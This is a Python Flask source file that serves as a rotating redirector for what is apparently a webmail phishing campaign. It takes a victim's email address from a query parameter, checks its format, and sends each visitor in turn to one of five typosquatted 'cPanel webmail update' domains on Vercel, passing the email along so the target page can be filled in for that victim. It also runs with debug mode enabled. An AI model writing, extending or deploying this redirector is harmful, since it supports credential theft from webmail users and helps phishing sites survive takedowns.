from flask import Flask, redirect, request
from flask import Response
import os

app = Flask(__name__)

DOMAINS = [
    'https://cpane-llwebmail-update-3-6-2-zip.vercel.app',
    'https://cpanellupdate-2-3-1-zip-vigilant-gi.vercel.app',
    'https://cpane-llwebmail-update-3-6-2-zip-sable.vercel.app',
    'https://webmail-cpanel-update-2-3-1-zip.vercel.app',
    'https://cpane-lwebmaiil-update-5-3-2-zip.vercel.app'
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    email = request.args.get('web', '')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        
        html = """<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Invalid Email</title></head>
<body style="margin:0;background:#0f1724;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Inter, ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, Arial;">
  <div style="background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));padding:28px;border-radius:14px;display:flex;gap:18px;align-items:center;box-shadow:0 10px 30px rgba(2,6,23,0.6);max-width:720px;width:92%;">
    <div style="flex:0 0 64px;height:64px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:rgba(217,70,74,0.12);">
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" aria-hidden="true">
        <path d="M12 9v4" stroke="#d9534f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M12 17h.01" stroke="#d9534f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke="#f87171" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>

    <div style="flex:1;color:#e6eef8;">
      <div style="display:flex;justify-content:space-between;align-items:center;">
        <h3 style="margin:0;font-size:18px;color:#fff;">Invalid email format</h3>
        <span style="font-size:12px;color:#9aa7bf;background:rgba(255,255,255,0.03);padding:6px 8px;border-radius:6px;">HTTP 400</span>
      </div>

      <p style="margin:10px 0 0 0;color:#c9d6ea;font-size:13px;line-height:1.4;">
        Your request is missing a valid <code style="background:#0b1220;padding:3px 6px;border-radius:4px;color:#66a3ff;font-family:monospace;">web</code> query parameter.
      </p>

      <p style="margin:8px 0 0 0;font-size:13px;color:#b7c6e0;">
        Use: <code style="background:#071029;padding:6px 8px;border-radius:6px;color:#8ef;" >?web=email@example.com</code>
      </p>
    </div>
  </div>
</body>
</html>
"""

        # return using Flask Response
        return Response(html, status=400, mimetype='text/html; charset=utf-8')

    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(debug=True)
